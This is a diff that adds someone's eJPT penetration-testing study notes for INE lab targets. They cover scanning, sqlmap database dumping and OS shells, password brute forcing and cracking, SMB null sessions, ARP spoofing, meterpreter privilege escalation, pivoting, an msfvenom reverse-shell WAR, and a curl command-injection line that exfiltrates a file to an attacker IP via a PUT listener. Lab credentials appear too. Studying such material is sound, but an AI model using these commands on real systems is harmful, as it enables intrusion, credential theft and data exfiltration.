@@ -1,0 +1,610 @@
+//eJPT preparation
+
+To check routing table 
+	1. 	$ ip route  on linux
+	2.	$ route print on windows
+	3. 	$ netstat  -r on OSX
+
+To perform ping sweep 
+	1. $ fping -a -g 10.10.0.0/16 
+	2. $ fping -a -g 10.10.0.0 10.10.255.255 
+	3. $ fping -a -g 10.10.0.0/16 2>/dev/null
+	4. $ fping -a -g 10.10.0.0 10.10.255.255 2>/dev/null
+
+	fping also uses ICMP, it will replace the usage of ping command where we need to ping every ip address in a network to find the host is alive or not. Even though we use the flag -a we get the error messages for dead hosts when we directly connected in a LAN network. To overcome this we just redirect the error messages into /dev/null/   
+
+To perform ping scan via nmap(Network Mapper):
+
+	syntax: $ nmap -sn <IP-range>
+
+	1. $ nmap -sn 200.200.0.0/16
+	2. $ nmap -sn 200.200.123.1-12
+	3. $ nmap -sn 172.16.12.*
+	4. $ nmap -sn 200.200.12-13.*
+
+To perform OS fingerprinting:
+
+	We use nmap for active reconnaissance. For passive we can capture traffic and analysis the packets from/to the hosts. We can also perform offline os fingerprinting using pOf.  
+
+	Command (nmap):
+
+	1. $ nmap -O <IPaddr>
+	2. $ nmap -Pn -O <IPaddr>
+
+	here -Pn flag is used to skip the ping scan if the alive hosts are already discovered. Also we know that the host is alive but not responding to ping probes then we can also use the above flag -Pn.
+
+	3. $ nmap -O --osscan-limit <targets>
+	
+	we can limit our targets towards os scan.
+
+	4. $ nmap -O --osscan-guess <targets>
+
+	For aggressive os scanning.
+
+General syntax of nmap:
+
+$ nmap <scanning-type(s)> <option(s)> <target(s)>
+
+	the most used scan types are 
+	1. TCP SYN scan 	(-sS)
+	2. TCP connect scan (-sT)
+	3. TCP version detection scan (-sV)
+
+	commands:
+	1. $ nmap -sT <target> 		
+	while performing deamons will have the logs
+	
+	2. $ nmap -sV <target>
+	will perform some TCP connect scan probes. Additionally we'll just grab the banner of the target and analysis the banner get to know what is the deamon and what is the version of the deamon running in the target. Incase we didn't get banner from the target then we'll send some probes and analysis how deamon gets reacted towards the probes we send. It is not stealthy. 
+
+	3. $ nmap -sS <target>
+	while performing deamons will not have the logs but an well-configured IDS can still detect these types of scans.
+	It is an default scan type in nmap.
+
+Target IP(s) via input file(s):
+$ nmap <scanning-type(s)> -iL <filename>
+
+Flag used to skip port scan: -sP
+
+Some nmap script command for nosql db:
+$ nmap -p27017 --script=mongodb-info target-2 | less
+$ nmap -p27017 --script=mongodb-databases target-2
+$ nmap -p27017 --script=mongodb-brute target-2
+
+Some nmap script command for sql db:
+$ nmap -p27017 --script=mysql-info target-2 | less
+$ nmap -p27017 --script=mysql-databases target-2
+$ nmap -p27017 --script=mysql-brute target-2
+
+we can also use wildcard i.e, * like mysql-*
+but it is advisable that not to use wildcard since it makes more noise which may cause the databases to block these noise making hosts.
+
+
+WEb-server fingerprinting:
+
+It can be done by manually or by automation tools
+Manual approach:
+	
+	1. Netcat - where we can use netcat as a server or a client. For webserver fingerprinting we use netcat as client makes a connection to the deamon listening on the server. After connection establishment server will send its banner so that we can analysis the banner from our side(client)
+	
+	$ nc <target-addr> 80 
+	here port 80 is the default port which we use the most.
+
+	After entering command in shell we need create(type) an http valid request with an HEAD http verb and hit return two times which will include two empty lines. After two return lines we get the response from the server with server's information, server's os, ... 
+	we can also enable -v flag in netcat which improves the verbosity of our connection since, netcat will not notify after the establishment of connection between client and the server.
+
+	example:
+
+	$ nc 8.8.8.8 80
+	HEAD / HTTP/1.0
+
+
+	***server's stuffs in response***
+
+	2. but for https connection we can use openssl command for https connection establishment 
+	example:
+	$ openssl s_client -connect target.site:443
+	HEAD / HTTP/1.0
+
+
+	***server's stuffs in response***
+
+Automatic approach:
+we use httprint tool 
+
+example: 
+$ httprint -P0 -h <target-host(s)> -s <signature-file>
+
+-P0 is used to avoid pinging the host.
+-h for target / targets specifying flag
+-s for specifying signature file
+
+Exploiting misconfigured HTTP verbs / methods:
+
+Location: D:\cy\eJPT
+
+Directory and file enumeration (Fuzzing):
+
+There are two technique, 
+	
+	1. Pure brute-force attack - ordinary method which is too slow since we give all the availabe file/directory/extension names and most of the names will be non-existing this makes more time to fuzz the correct name.
+	
+	2. Dictionary attack - Here we just provide all the commonly used file/directory/extension which consumes less time compared to pure brute-force. 
+	Some common backup file names are:
+		.bak, .old, .txt, .xxx
+	
+SQLmap:
+
+commands: (without shell)
+	
+1.	sqlmap -u "http://demo.ine.local/sqli_1.php?title=new" --cookie="PHPSESSID=8r9n4ndjj16s4f49qraum513g7; security_level=0" -p title 
+-> validates the vuln parameter is turly vulnerable
+
+2.	sqlmap -u "http://demo.ine.local/sqli_1.php?title=new" --cookie="PHPSESSID=8r9n4ndjj16s4f49qraum513g7; security_level=0" -p title --dbs
+-> returns all the databases
+
+3. sqlmap -u "http://demo.ine.local/sqli_1.php?title=new" --cookie="PHPSESSID=8r9n4ndjj16s4f49qraum513g7; security_level=0" -p title --dbs -D bWAPP --tables
+-> returns all the tables under specific DB
+
+4.	sqlmap -u "http://demo.ine.local/sqli_1.php?title=new" --cookie="PHPSESSID=8r9n4ndjj16s4f49qraum513g7; security_level=0" -p title --dbs -D bWAPP -T users --columns
+-> returns all the columns under a specific table
+
+5.	sqlmap -u "http://demo.ine.local/sqli_1.php?title=new" --cookie="PHPSESSID=8r9n4ndjj16s4f49qraum513g7; security_level=0" -p title --dbs -D bWAPP -T users -C admin,email,id,login,password --dump
+-> returns specific record from a DB under a table
+
+commands: (taking os-shell)
+
+1.	sqlmap -r /root/request.txt -p title 
+-> validates the vuln parameter is turly vulnerable
+
+2.	sqlmap -r /root/request.txt -p title --os-shell
+-> for gaining os-shell
+	
+	After the above command some options to follow
+
+	which web application language does the web server support?
+	[1] ASP
+	[2] ASPX
+	[3] JSP
+	[4] PHP (default)
+	> 4
+
+	do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
+	got a 302 redirect to 'http://demo.ine.local:80/login.php'. Do you want to follow? [Y/n] y
+	redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] n
+
+	what do you want to use for writable directory?
+	[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
+	[2] custom location(s)
+	[3] custom directory list file
+	[4] brute force search
+
+	/var/www/html,/var/www/clients/virtual/demo.ine/www,/var/www/clients/virtual/demo.ine.local/data,/var/www/clients/virtual/demo.ine/data,/var/www/clients/virtual/demo.ine.local/sites/all,/var/www/clients/virtual/demo.ine/sites/all,/var/www/clients/virtual/demo.ine.local/www/build,/var/www/clients/virtual/demo.ine/www/build
+	/var/www/htmlional custom directories [Enter for None]: /var/www/html
+
+3. Finally shel is obtained successfully
+
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+
+
+Cracking Passwords(Online):
+
+1. Using nmap:
+
+$ nmap -sS --script ssh-brute -p22 192.16.195.3 --script-args userdb=/root/user.txt passdb=/usr/share/nmap/nselib/data/passwords.lst
+
+2. Using hydra:
+
+$ hydra -l administrator -p password123 ssh://<IPaddr> -f -V
+
+$ hydra -L <username.txt> -P <password.txt> ssh://<IPaddr> -f -V 
+
+Breakdown:
+
+	-l for single username input parameter 
+	-L loads usernames from a file
+
+	-p for single password input
+	-P loads passwords from a file
+
+	-f intend hydra to stop if an valid password found
+	-V for verbosity
+
+3. Using metasploit:
+
+we use (auxiliary/scanner/ssh/ssh-login) module for bruteforcing ssh via metasploit 
+
+commands: 
+
+	use auxiliary/scanner/ssh/ssh_login
+	set RHOSTS demo.ine.local
+	set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+	set STOP_ON_SUCCESS true
+	set verbose true
+	exploit
+
+Cracking Passwords (Offline):
+
+1. Hashcat:
+
+$ hashcat -m 1800 -a 0 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt
+
+-a 0    -> attack type chooser (dictionary attack)
+-m 1800  -> algorithm type (SHA512)
+
+2. John:
+
+$ john --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt /etc/shadow
+	
+cracking MS-word document using john:
+
+$ office2john.py MS_Word_Document.docx > hash
+$ john --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt hash
+
+Windows shares:
+	Null session attacks:
+	examples: D:\cy\eJPT\win-shares
+
+1. 
+	Enumeration: (windows)
+	in windows: "nbtstat" command can be used.
+	basic  commands:
+	> nbtstat -A <IPaddr> 
+	returns infos about the target
+
+	once we end with that an host is up for file sharing we can start enumerating the shares of that particular host
+
+	we can use "NET VIEW" command after the above step.
+	> NET VIEW <targetIP>
+	this is exclusive for share enumeration on windows
+
+	Enumeration: (Linux)
+	in linux: "nmblookup" command can be used
+	basic commands:
+	$ nmblookup -A <IPaddr>
+
+	we can also perform smbclient command for enumeration:
+	$ smbclient -L //<targetIP> -N
+	where, -L returns what services are available on that network
+		   -N returns forces not to ask for password
+		   //<targetIP> here "//" is mandatory before target ip address
+
+	nmblookup will returns hidden administrative shares where, NET VIEW will not return this stuffs
+
+	we can also check the permission of shares using smbmap tool
+	command:
+		$ smbmap -H <targetIP>
+
+2.
+	Checking for NULL SESSION ATTACK:
+	After enumeration we can start to exploit the shares. 
+	In Null session attacks we will exploit administrative share i.e, IPC$ share by connecting to it without valid credentials.
+
+	IN windows we use NET USE command:
+		
+		> NET USE \\<targetIP>\IPC$ '' /u:''
+		the above command is used to connect the IPC$ share. This connection was established without username and password. We just give a try. If we got successful connection then the target is vulnerable to null session attack.
+
+		>NET USE \\<targetIP>\C$ '' /u:'' 
+		here we will not make successful connection since the above method will only works for IPC$ share not for C$ share. After executing this command we get "access denied" 
+
+	IN linux we use smbclient command:
+
+		$ smbclient //<targetIP>/IPC$ -N
+		we get access
+
+		$ smbclient //<targetIP>/C$ -N 
+		we get access-denied
+
+3. 
+	EXploiting null session attack (using Enum):
+	"enum" is an automated command line tool  for both linux and windows
+	command(s):
+
+	enum -S <targetIP>
+	for enumerating shares
+	
+	enum -U <targetIP>
+	for enumerating users
+
+	enum -P <targetIP>
+	for enumerating password policies which is soo helpful before mounting network authentication attack. using this we can know the min pass length, max pass length which are helpful when we start bruteforcing for passwords.
+
+	we can also use enum4linux in command line. As compared to other tools emun4linux has some more features. It's flags has the same usage as enum flag has.
+
+	enum4linux:
+	$ enum4linux -d -S demo.ine.local
+	where,
+		-d returns detailed informations about the shares of an target
+		-S list of shares
+
+sample workflow:
+
+smbclient ->	$ smbclient -L //<targetIP> -N
+
+nmblookup (or) enum4linux ->	$ nmblookup -A <IPaddr>
+								$ enum4linux -a <targetIP>
+
+smbmap -> 	$ smbmap -H <targetIP> 
+
+enum4linux -> 	$ enum4linux -d -S <targetIP>
+				$ enum4linux -s <filename> <targetIP>
+
+smbclient -> 	$ smbclient //<targetIP> -N 
+
+ARP  spoofing :
+
+1. we enable ip forwading in our kali 
+$ echo 1 > /proc/sys/net/ipv4/ip_forward
+
+2. using arpspoof we start to arp poisoining 
+$ arpspoof -i <interface> -t <target's IP> -r <destination of the target>
+	
+Example:
+
+$ arpspoof -i eth1 -t 192.168.10.13 -r 192.168.10.155
+where, 
+	192.168.10.13 is the target's ip 
+	192.168.10.155 is the server's ip in our case. Where we tell the target that the server is us so that the target machine will send all the packects to us instead of sending it to the server directly. Since we are like proxy we can manipulate the packet from the target and can able to send packet to the desired destination of the target.
+
+3. Using wireshark we can sniff the packets travelling through us. 
+
+4. To disable ip forwarding 
+$ echo 0 > /proc/sys/net/ipv4/ip_forward
+
+Information gathering command using meterpreter:
+
+> sysinfo
+> ifconfig
+> route
+> getuid
+> getpid	(returns our process id)
+> ps
+> getsystem  (for gaining highest priviledge ex: "SYSTEM" in windows)
+
+sometimes UAC-User Account Control will evade the use of getsystem. But still we can bypass UAC. 
+	
+	To find whether the UAC is enabled in the target machine we can by,
+	> run post/windows/gather/win_privs
+
+	1. By using "bypassuac" module:
+
+		> background
+		> search bypassuac 
+		> use exploit/windows/local/bypassuac 
+		> set session <no>   (session in background)
+		> exploit
+
+		After exploiting the target with bypassuac, now we can perform getsystem for gainig highest priviledges
+
+		> getsystem 
+
+we can dump the password database and save it for offline cracking session
+for dumping we can use "hashdump" module
+	> bg
+	> use post/windows/gather/hashdump
+	> show options
+	> set session <no> (session in background)
+
+we can explore the victim machine,
+> pwd
+> cd C:\\
+> ls
+
+we can upload and download files into/from the exploited machine by using some homonymous commands,
+	> download bank-balance.png /root/
+	which will download the bank-balance.png from the target machine and save it in the root directory of our machine.
+
+	> upload /root/backdoor.exe C://Windows
+	which will upload backdoor.exe from the root directory of our machine into the target machine's Windows directory in "C" drive
+
+We can also obtain an standard OS shell by,
+> shell 
+
+To get brief usage of command we can use help for all the commands (or) <command> -h for specific command,
+Example:
+	> help 
+	> upload -h
+
+Black Box testing 1:
+
+If we found an target has connection of two network interface, and when we try to access the other network from our kali via ping we can't. In this case we can use pivating to access the  unaccessible target. The commands used for pivoting are 
+
+commands:
+	
+	run autoroute -h (for meterpreter)
+	route (for metasploit and kali's shell)
+
+examples:
+
+case-1:
+
+	run autoroute -s 192.69.228.0 -n 255.255.255.0 
+	where,    -s denotes subnet of the network its not target's IP its whole target's 					network 	
+			  -n netmask of the network
+			  192.69.228.0 is the network and 192.69.228.2 the target IP we could not able to access.
+
+	we can then check the route table by Background the current session and can use route command.
+	commands:
+		> bg
+		> route print
+	From the above step we can make sure the route is successfully made.
+
+case-2:
+	
+	route add 192.69.228.0 255.255.255.0 1
+	where, 
+			add   ->  to make a new route
+			192.69.228.0  ->  target's network (subnet)
+			255.255.255.0  ->  netmask of the network (netmask)
+			1  ->  sid (meterpreter session ID)
+
+we can perform port scanning using metasploit:
+	
+	commands:
+		> use auxiliary/scanner/portscan/tcp
+		> set PORTS 80, 8080, 445, 21, 22
+		> set RHOSTS 192.69.228.3-10
+		> exploit
+	As a result of scanning we found that BOTH FTP and SSH service are active in the network we just made an route to. 
+
+To perform port forwarding we use "portfwd" in meterpreter via active session.
+
+commands:
+	> portfwd -h 
+	> portfwd add -l 1234 -p 21 -r 192.69.228.3
+		where, -l denotes local port which is the port we want to use in our local 				machine(kali)
+			   -p denotes remote port which is our target's port
+			   -r denotes target host. 
+	> portfwd list
+
+	Then Running nmap on the forwarded local port to identify the service name,
+	commands: 
+		> background
+		> nmap -sS -sV -p 1234 localhost
+		where, localhost -> since we did portforwarding to target. WE made the portfwd from target to our kali machine which is the localhost here.
+Blackbox testing:
+
+> nmap -A -p- server1.ine.local
+	80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.13)
+	Running: Linux 4.X|5.X
+
+Meta-module for enumerate user's terminal/shell history:
+	> use post/linux/gather/enum_users_history
+	> exploit
+
+	As a result we get,
+	/root/.msf4/loot/20220809073248_default_192.101.190.3_linux.enum.users_303514.txt
+	and the above file got downloaded in our kali instance
+
+	From the file we got credentials to MYSQL,
+	mysql -h 192.101.190.4 -u root -pfArFLP29UySm4bZj
+
+		in our kali,
+		> mysql -h server2.ine.local -u root -pfArFLP29UySm4bZj
+
+			> show databases;
+			since we didnt got useful infos we are moving to getting shell access of the machine so we are searching for mmysql in meta and we use exploit/multi/mysql/mysql_udf_payload module.
+
+			> set FORCE_UDF_UPLOAD true
+			> set PASSWORD fArFLP29UySm4bZj
+			> set RHOSTS server2.ine.local
+			> set TARGET 1
+			> set LHOST 192.73.96.2
+			> exploit
+			> session -i 2
+
+			we set FORCE_UDF_UPLOAD true because we need to execute shell commands for that it need to install sys_exec() MYSQL function.
+			Also we set TARGET value to  1 since the os of mysql is linux which has the value of 1 and 0 by default as windows.
+
+
+> nmap -A -p- server2.ine.local
+	3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
+	| mysql-info: 
+	|   Protocol: 10
+	|   Version: 5.5.62-0ubuntu0.14.04.1
+	|   Thread ID: 45
+	|   Capabilities flags: 63487
+	|   Some Capabilities: IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, LongPassword, FoundRows, SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, SupportsTransactions, SupportsLoadDataLocal, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+	|   Status: Autocommit
+	|   Salt: *E`5$T[KG`.d.VG?H-DQ
+	|_  Auth Plugin Name: mysql_native_password
+	Running: Linux 4.X|5.X
+
+> nmap -A -p- server3.ine.local
+	22/tcp   open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
+	8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+	|_http-title: Site doesn't have a title (text/html).
+	| http-methods: 
+	|_  Potentially risky methods: PUT DELETE
+	|_http-server-header: Apache-Coyote/1.1
+	Running: Linux 4.X|5.X
+
+	> dirb http://server3.ine.local:8080/
+
+	Since we came to know the service is tomcat we use use auxiliary/scanner/http/tomcat_mgr_login module.
+
+	> use auxiliary/scanner/http/tomcat_mgr_login
+	> set RHOSTS server3.ine.local
+	> set VERBOSE false
+	> exploit
+
+	After login with the received credentials we got an WAR file upload. 
+
+	Creating WAR file and deploying the target server.
+
+	> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.122.248.2 LPORT=6666 -f war > shell.war
+	> file shell.war
+
+	After deploying malicious WAR file, visit /shell use nc listener to get reverse-shell.
+
+Black Box testing 2:
+
+ > git log 
+ returns updated history of the cloned github repository.
+
+ > git diff <TO> <FROM>
+ returns what is updated in the code from given phase.
+ example:  git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
+
+ After changing the source code(updating/editing) we need to commit the changes made,
+ commands are,
+ > git status
+ returns the status of the modified file that whether the file needs to be commit
+
+ > git add .
+
+ > git commit -m "Description" --author " name <emailaddress> "
+ commits the changes made to the code and gets reflected in repository
+ example: git commit -m "Bug fixed" --author "harish<crackedversion@gmail.com>"
+
+ > git push
+ changes made to the remote repository. 
+
+ Proxyserver module:
+
+ > use auxiliary/server/socks_proxy
+ > set VERSION 4a 
+ > set SRVPORT 9050
+ > run -j 
+
+ Executing commands using proxychians:
+  > proxychains <command>
+  example:
+  	> proxychains nmap -sT -P0 8.8.8.8
+
+Since we couldn't able to access the target machine directly we use proxychains. 
+To achieve shell of that target machine we will perform bind shell not reverse shell since accessing the target machine is bit tricky.
+To perform bind shell we use groovy reverse shell
+source:
+https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
+After executing bind shell payload we make the target machine as server which will listens for incoming connections. 
+We use netcat for achieving bind shell where in this case we'll be client.
+command:
+	proxychains nc -v <targetIP> <target's portnumber, which listens for connections>
+
+
+If we stuck in a cae where we could not able to perform nc, python (listening commands) but allowed to use curl in a target then we must try data exfiltration method. The following code is an python listening script where we need to run this file in our machine and use curl command on our target machine for example:
+
+$ python server.py 80       in our machine
+$ http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip    												in our target machine
+
+code:
+
+#!/usr/bin/python
+
+import SimpleHTTPServer
+import BaseHTTPServer
+
+class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_PUT(self):
+        print self.headers
+        length = int(self.headers["Content-Length"])
+        path = self.translate_path(self.path)
+        with open(path, "wb") as dst:
+            dst.write(self.rfile.read(length))
+
+if __name__ == '__main__':
+    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
